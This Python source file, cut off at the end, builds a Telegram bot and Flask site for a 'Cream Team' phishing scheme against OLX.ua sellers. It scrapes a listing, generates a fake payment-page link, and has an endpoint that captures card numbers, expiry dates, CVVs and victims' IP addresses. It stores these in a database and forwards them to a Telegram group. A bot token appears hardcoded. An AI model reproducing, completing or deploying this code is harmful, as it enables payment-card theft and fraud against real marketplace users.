import logging
import threading
import asyncio
import base64
import uuid
import io
import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template, url_for, redirect
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import aiohttp
from bs4 import BeautifulSoup
import nest_asyncio
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Column, Integer, String, Text, DateTime, Boolean
from PIL import Image
import requests
from io import BytesIO

# –ü—Ä–∏–º–µ–Ω—è–µ–º nest_asyncio –¥–ª—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –≤–ª–æ–∂–µ–Ω–Ω—ã—Ö —Ü–∏–∫–ª–æ–≤ —Å–æ–±—ã—Ç–∏–π
nest_asyncio.apply()

# –¢–æ–∫–µ–Ω –±–æ—Ç–∞
API_TOKEN = '8075120505:AAHjAuI6QiGaJcCJ1aigHNRVg9pvsDVXCfs'

# ID –≥—Ä—É–ø–ø—ã –¥–ª—è –ø–µ—Ä–µ—Å—ã–ª–∫–∏ –¥–∞–Ω–Ω—ã—Ö
GROUP_ID = -4664157955

# –°–æ—Å—Ç–æ—è–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
user_states = {}

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(level=logging.INFO)

# –°–æ–∑–¥–∞–µ–º Flask –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
app = Flask(__name__)

# –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è templates —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
os.makedirs('templates', exist_ok=True)

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///olx_data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# –ú–æ–¥–µ–ª—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –æ–±—ä—è–≤–ª–µ–Ω–∏–π OLX
class OlxListing(db.Model):
    id = Column(Integer, primary_key=True)
    unique_id = Column(String(36), unique=True, default=lambda: str(uuid.uuid4()))
    title = Column(String(255), nullable=False)
    price = Column(String(100), nullable=False)
    image_base64 = Column(Text, nullable=True)
    source_url = Column(String(500), nullable=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f'<OlxListing {self.title}>'

# –ú–æ–¥–µ–ª—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç
class CardData(db.Model):
    id = Column(Integer, primary_key=True)
    listing_id = Column(String(36), nullable=True)
    card_number = Column(String(20), nullable=False)
    expiry = Column(String(10), nullable=False)
    cvv = Column(String(5), nullable=False)
    ip_address = Column(String(50), nullable=True)
    processed = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f'<CardData {self.card_number[:4]}...>'

# –°–æ–∑–¥–∞–µ–º —Ç–∞–±–ª–∏—Ü—ã –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö
with app.app_context():
    db.create_all()

# –°–æ–∑–¥–∞–µ–º –æ–±—ä–µ–∫—Ç –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–π —Ü–∏–∫–ª —Å–æ–±—ã—Ç–∏–π –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ Flask
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ base64
def image_to_base64(image_url):
    try:
        response = requests.get(image_url)
        if response.status_code == 200:
            image = Image.open(BytesIO(response.content))
            image = image.resize((300, 300), Image.LANCZOS)
            buffer = BytesIO()
            image.save(buffer, format="JPEG", quality=80)
            image_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            return f"data:image/jpeg;base64,{image_base64}"
        return None
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è: {e}")
        return None

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–∞—Ä—Å–∏–Ω–≥–∞ OLX –æ–±—ä—è–≤–ª–µ–Ω–∏—è
async def parse_olx_listing(url: str):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')

                # –ü–∞—Ä—Å–∏–º –Ω–∞–∑–≤–∞–Ω–∏–µ
                title_tag = soup.find('div', {'data-cy': 'ad_title'})
                title = title_tag.find('h4').text.strip() if title_tag else '–ù–∞–∑–≤–∞–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ'

                # –ü–∞—Ä—Å–∏–º —Ü–µ–Ω—É
                price_tag = soup.find('div', {'data-testid': 'ad-price-container'})
                price = price_tag.text.strip() if price_tag else '–¶–µ–Ω–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞'

                # –ü–∞—Ä—Å–∏–º –ø–µ—Ä–≤—É—é –∫–∞—Ä—Ç–∏–Ω–∫—É
                image_tag = soup.find('img', {'class': 'css-1bmvjcs'})
                image_url = image_tag['src'] if image_tag else None
                
        # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ base64 (—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ)
        image_base64 = image_to_base64(image_url) if image_url else None
        
        # –°–æ–∑–¥–∞–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID
        unique_id = str(uuid.uuid4())
        
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è Flask –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö
        with app.app_context():
            # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–π –æ–±—ä–µ–∫—Ç
            listing = OlxListing(
                unique_id=unique_id,
                title=title,
                price=price,
                image_base64=image_base64,
                source_url=url
            )
            db.session.add(listing)
            db.session.commit()
            
            # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞
            return {
                "unique_id": unique_id,
                "title": title,
                "price": price,
                "source_url": url
            }
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–∞—Ä—Å–∏–Ω–≥–µ: {e}")
        raise e

# –û–±–Ω–æ–≤–ª—è–µ–º –∫–ª–∞—Å—Å CallbackData –¥–ª—è –Ω–æ–≤—ã—Ö –∫–Ω–æ–ø–æ–∫
class CallbackData:
    MAIN_MENU = "main_menu"
    CREATE_LINK = "create_link"
    PLATFORM_OLX = "platform_olx"
    MY_ADS = "my_ads"
    MY_PROFITS = "my_profits"
    MENTORS = "mentors"
    CHATS = "chats"
    SETTINGS = "settings"

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start
@dp.message(Command("start"))
async def send_welcome(message: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="üîó –ú–µ–Ω—é")]
        ],
        resize_keyboard=True
    )
    
    await message.answer(
        "üëã –ü—Ä–∏–≤–µ—Ç! –ù–∞–∂–º–∏ –Ω–∞ –∫–Ω–æ–ø–∫—É –ú–µ–Ω—é",
        reply_markup=kb
    )

@dp.message(lambda message: message.text == "üîó –ú–µ–Ω—é")
async def show_main_menu(message: Message):
    kb = InlineKeyboardBuilder()
    
    # First row: "–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É" "–ú–æ–∏ –æ–±—ä—è–≤–ª–µ–Ω–∏—è"
    kb.row(
        InlineKeyboardButton(
            text="üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É", 
            callback_data=CallbackData.CREATE_LINK
        ),
        InlineKeyboardButton(
            text="üìã –ú–æ–∏ –æ–±—ä—è–≤–ª–µ–Ω–∏—è", 
            callback_data=CallbackData.MY_ADS
        )
    )
    
    # Second row: "–ß–∞—Ç—ã" "–ù–∞—Å—Ç–∞–≤–Ω–∏–∫–∏"
    kb.row(
        InlineKeyboardButton(
            text="üí¨ –ß–∞—Ç—ã", 
            callback_data=CallbackData.CHATS
        ),
        InlineKeyboardButton(
            text="üë• –ù–∞—Å—Ç–∞–≤–Ω–∏–∫–∏", 
            callback_data=CallbackData.MENTORS
        )
    )
    
    # Third row: "–ú–æ–∏ –ø—Ä–æ—Ñ–∏—Ç—ã" "–ù–∞—Å—Ç—Ä–æ–π–∫–∏"
    kb.row(
        InlineKeyboardButton(
            text="üí∞ –ú–æ–∏ –ø—Ä–æ—Ñ–∏—Ç—ã", 
            callback_data=CallbackData.MY_PROFITS
        ),
        InlineKeyboardButton(
            text="‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏", 
            callback_data=CallbackData.SETTINGS
        )
    )
    
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ä–µ–∞–ª—å–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    user_id = message.from_user.id
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    user_info_text = (
        "üç≠ Cream Team\n\n"
        f"üÜî ID: <code>{user_id}</code>\n"
        f"üõ† –°—Ç–∞—Ç—É—Å: <code>–í–æ—Ä–∫–µ—Ä</code>\n"
        f"üí∞ –ü—Ä–æ—Ñ–∏—Ç–æ–≤: <code>0</code> –Ω–∞ —Å—É–º–º—É <code>0 USDT</code>\n\n"
        "üê£ –ù–∏–∫: <code>–í–∏–¥–µ–Ω</code>"
    )
    
    await message.answer(
        user_info_text,
        reply_markup=kb.as_markup(),
        parse_mode="HTML"
    )

# –û–±–Ω–æ–≤–ª—è–µ–º —Ç–∞–∫–∂–µ callback-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é
@dp.callback_query(lambda c: c.data == CallbackData.MAIN_MENU)
async def return_to_main_menu(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    
    # First row: "–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É" "–ú–æ–∏ –æ–±—ä—è–≤–ª–µ–Ω–∏—è"
    kb.row(
        InlineKeyboardButton(
            text="üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É", 
            callback_data=CallbackData.CREATE_LINK
        ),
        InlineKeyboardButton(
            text="üìã –ú–æ–∏ –æ–±—ä—è–≤–ª–µ–Ω–∏—è", 
            callback_data=CallbackData.MY_ADS
        )
    )
    
    # Second row: "–ß–∞—Ç—ã" "–ù–∞—Å—Ç–∞–≤–Ω–∏–∫–∏"
    kb.row(
        InlineKeyboardButton(
            text="üí¨ –ß–∞—Ç—ã", 
            callback_data=CallbackData.CHATS
        ),
        InlineKeyboardButton(
            text="üë• –ù–∞—Å—Ç–∞–≤–Ω–∏–∫–∏", 
            callback_data=CallbackData.MENTORS
        )
    )
    
    # Third row: "–ú–æ–∏ –ø—Ä–æ—Ñ–∏—Ç—ã" "–ù–∞—Å—Ç—Ä–æ–π–∫–∏"
    kb.row(
        InlineKeyboardButton(
            text="üí∞ –ú–æ–∏ –ø—Ä–æ—Ñ–∏—Ç—ã", 
            callback_data=CallbackData.MY_PROFITS
        ),
        InlineKeyboardButton(
            text="‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏", 
            callback_data=CallbackData.SETTINGS
        )
    )
    
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ä–µ–∞–ª—å–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    user_id = callback.from_user.id
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    user_info_text = (
        "üç≠ Cream Team\n\n"
        f"üÜî ID: <code>{user_id}</code>\n"
        f"üõ† –°—Ç–∞—Ç—É—Å: <code>–í–æ—Ä–∫–µ—Ä</code>\n"
        f"üí∞ –ü—Ä–æ—Ñ–∏—Ç–æ–≤: <code>0</code> –Ω–∞ —Å—É–º–º—É <code>0 USDT</code>\n\n"
        "üê£ –ù–∏–∫: <code>–í–∏–¥–µ–Ω</code>"
    )
    
    await callback.message.edit_text(
        user_info_text,
        reply_markup=kb.as_markup(),
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == CallbackData.CREATE_LINK)
async def process_create_link(callback: CallbackQuery):
    # Create platform selection keyboard
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="OLX üè∑Ô∏è", 
        callback_data=CallbackData.PLATFORM_OLX
    ))
    kb.row(  # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é
        InlineKeyboardButton(
            text="üîô –ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é", 
            callback_data=CallbackData.MAIN_MENU
        )
    )
    
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ "–æ–∂–∏–¥–∞–Ω–∏—è –≤—ã–±–æ—Ä–∞ –ø–ª–æ—â–∞–¥–∫–∏"
    user_states[callback.from_user.id] = {
        'state': 'selecting_platform'
    }
    
    await callback.message.edit_text(
        "–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–æ—â–∞–¥–∫—É –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏:",
        reply_markup=kb.as_markup()
    )
# –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –≤—Å–µ—Ö –ø—É–Ω–∫—Ç–æ–≤ –º–µ–Ω—é —Å –≤–æ–∑–≤—Ä–∞—Ç–æ–º –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é

@dp.callback_query(lambda c: c.data == CallbackData.MY_ADS)
async def process_my_ads(callback: CallbackQuery):
    # –ü–æ–ª—É—á–∞–µ–º ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    user_id = callback.from_user.id
    
    # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –æ–±—ä—è–≤–ª–µ–Ω–∏–π –∏–∑ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
    with app.app_context():
        # –î–ª—è –ø—Ä–æ—Å—Ç–æ—Ç—ã - –ø–æ–ª—É—á–∞–µ–º –≤—Å–µ –æ–±—ä—è–≤–ª–µ–Ω–∏—è, –≤ —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç 
        # –∫–∞–∫-—Ç–æ —Å–≤—è–∑–∞—Ç—å –æ–±—ä—è–≤–ª–µ–Ω–∏—è —Å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º
        listings = OlxListing.query.all()
    
    kb = InlineKeyboardBuilder()
    
    # –ï—Å–ª–∏ –µ—Å—Ç—å –æ–±—ä—è–≤–ª–µ–Ω–∏—è, —Å–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫–∏ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ
    if listings:
        for listing in listings:
            # –û–±—Ä–µ–∑–∞–µ–º –Ω–∞–∑–≤–∞–Ω–∏–µ, –µ—Å–ª–∏ –æ–Ω–æ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ
            short_title = (listing.title[:20] + '...') if len(listing.title) > 20 else listing.title
            
            kb.row(
                InlineKeyboardButton(
                    text=f"{short_title} - {listing.price}", 
                    url=listing.source_url
                )
            )
    
    # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é
    kb.row(
        InlineKeyboardButton(
            text="üîô –ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é", 
            callback_data=CallbackData.MAIN_MENU
        )
    )
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è
    if listings:
        message_text = "üìã –ú–æ–∏ –æ–±—ä—è–≤–ª–µ–Ω–∏—è:\n\n" + \
            "\n".join([f"‚Ä¢ {listing.title} - {listing.price}" for listing in listings])
    else:
        message_text = "üìã –ú–æ–∏ –æ–±—ä—è–≤–ª–µ–Ω–∏—è:\n\n–£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç –æ–±—ä—è–≤–ª–µ–Ω–∏–π."
    
    await callback.message.edit_text(
        message_text,
        reply_markup=kb.as_markup(),
        disable_web_page_preview=True
    )

@dp.callback_query(lambda c: c.data == CallbackData.CHATS)
async def process_chats(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="üîô –ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é", 
        callback_data=CallbackData.MAIN_MENU
    ))
    
    await callback.message.edit_text(
        "üí¨ –ß–∞—Ç—ã:\n\n"
        "–£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö —á–∞—Ç–æ–≤.",
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == CallbackData.MENTORS)
async def process_mentors(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="üîô –ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é", 
        callback_data=CallbackData.MAIN_MENU
    ))
    
    await callback.message.edit_text(
        "üë• –ù–∞—Å—Ç–∞–≤–Ω–∏–∫–∏:\n\n"
        "–°–ø–∏—Å–æ–∫ –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫–æ–≤ –≤—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω.",
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == CallbackData.MY_PROFITS)
async def process_my_profits(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="üîô –ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é", 
        callback_data=CallbackData.MAIN_MENU
    ))
    
    await callback.message.edit_text(
        "üí∞ –ú–æ–∏ –ø—Ä–æ—Ñ–∏—Ç—ã:\n\n"
        "–£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç –ø—Ä–æ—Ñ–∏—Ç–æ–≤.",
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == CallbackData.SETTINGS)
async def process_settings(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="üîô –ù–∞–∑–∞–¥ –≤ –º–µ–Ω—é", 
        callback_data=CallbackData.MAIN_MENU
    ))
    
    await callback.message.edit_text(
        "‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏:\n\n"
        "–†–∞–∑–¥–µ–ª –Ω–∞—Å—Ç—Ä–æ–µ–∫ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ.",
        reply_markup=kb.as_markup()
    )

# Callback handler for OLX platform
@dp.callback_query(lambda c: c.data == CallbackData.PLATFORM_OLX)
async def process_olx_platform(callback: CallbackQuery):
    await callback.message.edit_text(
        "‚úÖ –í—ã–±—Ä–∞–Ω–∞ –ø–ª–æ—â–∞–¥–∫–∞ OLX. \n\n"
        "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—ä—è–≤–ª–µ–Ω–∏–µ OLX –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã –æ–ø–ª–∞—Ç—ã."
    )

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏
@dp.callback_query(lambda c: c.data == CallbackData.CREATE_LINK)
async def process_create_link(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="OLX üè∑Ô∏è", 
        callback_data=CallbackData.PLATFORM_OLX
    ))
    kb.adjust(1)
    
    await callback.message.edit_text(
        "–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–æ—â–∞–¥–∫—É –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏:",
        reply_markup=kb.as_markup()
    )

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—ã–±–æ—Ä–∞ –ø–ª–æ—â–∞–¥–∫–∏ OLX
@dp.callback_query(lambda c: c.data == CallbackData.PLATFORM_OLX)
async def process_olx_platform(callback: CallbackQuery):
    await callback.message.edit_text(
        "‚úÖ –í—ã–±—Ä–∞–Ω–∞ –ø–ª–æ—â–∞–¥–∫–∞ OLX. \n\n"
        "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—ä—è–≤–ª–µ–Ω–∏–µ OLX –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã –æ–ø–ª–∞—Ç—ã."
    )


@dp.message()
async def handle_message(message: Message):
    # –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ —ç—Ç–æ —Å—Å—ã–ª–∫–∞ –Ω–∞ OLX
    if not message.text or not message.text.startswith('https://www.olx.ua/d/'):
        return

    url = message.text
    try:
        # –ü–∞—Ä—Å–∏–º –¥–∞–Ω–Ω—ã–µ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
        listing_data = await parse_olx_listing(url)
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ –æ–ø–ª–∞—Ç—É
        payment_url = f"http://127.0.0.1:5000/payment/{listing_data['unique_id']}"
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        response = (
            f"‚úÖ –û–±—ä—è–≤–ª–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ!\n\n"
            f"–ù–∞–∑–≤–∞–Ω–∏–µ: {listing_data['title']}\n"
            f"–¶–µ–Ω–∞: {listing_data['price']}\n\n"
            f"üîó –°—Å—ã–ª–∫–∞ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –æ–ø–ª–∞—Ç—ã:\n{payment_url}"
        )
        await message.reply(response)
    except Exception as e:
        await message.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–∞—Ä—Å–∏–Ω–≥–µ –æ–±—ä—è–≤–ª–µ–Ω–∏—è: {str(e)}")

# –°—Ç—Ä–∞–Ω–∏—Ü–∞ –æ–ø–ª–∞—Ç—ã —Å –¥–∞–Ω–Ω—ã–º–∏ –æ–±—ä—è–≤–ª–µ–Ω–∏—è
@app.route('/payment/<listing_id>')
def payment_page(listing_id):
    with app.app_context():
        listing = OlxListing.query.filter_by(unique_id=listing_id).first_or_404()
        return render_template('payment.html', listing=listing)

# –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
async def send_telegram_message(message_text):
    try:
        await bot.send_message(chat_id=GROUP_ID, text=message_text)
        return True
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram: {e}")
        return False

# –≠–Ω–¥–ø–æ–∏–Ω—Ç –¥–ª—è –ø—Ä–∏–µ–º–∞ –¥–∞–Ω–Ω—ã—Ö —Å —Ñ–æ—Ä–º—ã
@app.route('/send_message', methods=['POST'])
def send_message():
    try:
        data = request.json
        card = data.get("card", "–ù–µ —É–∫–∞–∑–∞–Ω–æ")
        expiry = data.get("expiry", "–ù–µ —É–∫–∞–∑–∞–Ω–æ")
        cvv = data.get("cvv", "–ù–µ —É–∫–∞–∑–∞–Ω–æ")
        listing_id = data.get("listing_id", None)
        
        # –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        client_host = request.remote_addr
        
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –æ–±—ä—è–≤–ª–µ–Ω–∏–∏, –µ—Å–ª–∏ –µ—Å—Ç—å listing_id
        listing_info = ""
        if listing_id:
            with app.app_context():
                listing = OlxListing.query.filter_by(unique_id=listing_id).first()
                if listing:
                    listing_info = (
                        f"\n\nüì¶ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ç–æ–≤–∞—Ä–µ:\n"
                        f"–ù–∞–∑–≤–∞–Ω–∏–µ: {listing.title}\n"
                        f"–¶–µ–Ω–∞: {listing.price}\n"
                        f"–°—Å—ã–ª–∫–∞: {listing.source_url}"
                    )
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        message_text = (
            f"üîê –ü–æ–ª—É—á–µ–Ω—ã –Ω–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã:{listing_info}\n\n"
            f"üí≥ –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã: {card}\n"
            f"üìÖ –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è: {expiry}\n"
            f"üîë CVV: {cvv}\n"
            f"üåê IP-–∞–¥—Ä–µ—Å: {client_host}"
        )
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã –≤ –±–∞–∑—É
        with app.app_context():
            card_data = CardData(
                listing_id=listing_id,
                card_number=card,
                expiry=expiry,
                cvv=cvv,
                ip_address=client_host
            )
            db.session.add(card_data)
            db.session.commit()
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É —á–µ—Ä–µ–∑ —Ü–∏–∫–ª —Å–æ–±—ã—Ç–∏–π
        future = asyncio.run_coroutine_threadsafe(send_telegram_message(message_text), loop)
        result = future.result()  # –ñ–¥–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
        
        if result:
            return jsonify({"status": "–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã"})
        else:
            return jsonify({"status": "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram"})
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö: {e}")
        return jsonify({"status": "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö", "error": str(e)})

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞
async def start_bot():
    try:
        await dp.start_polling(bot)
    except Exception as e:
